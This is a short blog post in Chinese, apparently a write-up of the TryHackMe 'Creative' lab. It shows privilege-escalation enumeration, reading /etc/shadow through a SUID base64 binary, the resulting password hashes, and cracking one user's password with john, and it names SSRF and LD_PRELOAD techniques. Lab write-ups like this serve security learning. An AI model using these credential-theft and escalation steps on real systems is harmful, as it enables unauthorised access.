---
layout: post
title:  "TryHackMe Challenge Writeup: Creative"
date:   1 July 2025
categories: Demo
tags: TryHackMe-Challenge Writeup
---
<html>
<body>
<div markdown="block" style="margin-top: 10px">
    
### Intro
本篇是關於TryHackMe上的Challenge: [Creative](https://tryhackme.com/room/creative) 我的解題思路和歷程，紀錄自己嘗試了哪些手段以及學習了哪些新的攻擊手法和切入角度


### Attempt
1. Kernel Exploit: [Exploit-DB](https://www.exploit-db.com/exploits/42887): Kernel version沒有說到完全一樣，因此先不執行
2. sudo -l 沒有
3. linpeas => 找到很多東西:
- base64有SUID，可以read檔案
- PATH

```bash
╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                                                                            
/home/leonard/scripts:/usr/sue/bin:/usr/lib64/qt-3.3/bin:/home/leonard/perl5/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/opt/puppetlabs/bin:/home/leonard/.local/bin:/home/leonard/bin                                                                                                                                                                     
New path exported: /home/leonard/scripts:/usr/sue/bin:/usr/lib64/qt-3.3/bin:/home/leonard/perl5/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/opt/puppetlabs/bin:/home/leonard/.local/bin:/home/leonard/bin:/sbin:/bin
```


### base64(SUID)
- 查看 /etc/shadow

```bash
root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::
leonard:$6$JELumeiiJFPMFj3X$OXKY.N8LDHHTtF5Q/pTCsWbZtO6SfAzEQ6UkeFJy.Kx5C9rXFuPr.8n3v7TbZEttkGKCVj50KavJNAm7ZjRi4/::0:99999:7:::
missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::
```

- unshadow 後用 john 破解 missy 用戶密碼:

```bash
└─$ john --wordlist=/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt unshadow.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 ASIMD 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password1        (missy)     
1g 0:00:00:00 DONE (2025-07-02 03:01) 1.219g/s 4370p/s 4370c/s 4370C/s mayday..hedgehog
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```



### 總結
自己卡關的步驟:
- 枚舉虛擬主機
- SSRF => 枚舉開放port
- 新的提權手法: `env_keep+=LD_PRELOAD`


## 學習資料
1. [TryHackMe Challenge: Creative](https://tryhackme.com/room/creative)
2. [Writeup \| Creative](https://0xb0b.gitbook.io/writeups/tryhackme/2024/creative)
3. [使用LD_Preload的Linux权限升级技巧](https://www.cnblogs.com/backlion/p/10503985.html)

</div>
</body>
</html>
